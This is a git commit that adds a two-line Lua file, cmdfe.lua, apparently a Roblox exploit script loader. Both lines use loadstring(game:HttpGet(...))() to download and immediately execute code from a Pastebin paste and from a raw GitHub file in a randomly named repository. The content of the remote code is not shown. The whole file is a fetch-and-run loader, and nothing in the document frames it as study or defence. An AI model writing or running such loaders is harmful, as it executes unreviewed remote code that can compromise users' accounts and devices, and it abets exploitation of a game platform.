c367338293545ec8b1da22f164063c2da48f98c2
IssacRawCoreOfficiak <issacrawcore@gmail.com>
2024-10-11 20:15:59 -0300

    cmdfe.lua

---
+++ cmdfe.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/VNtyMuFL"))() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
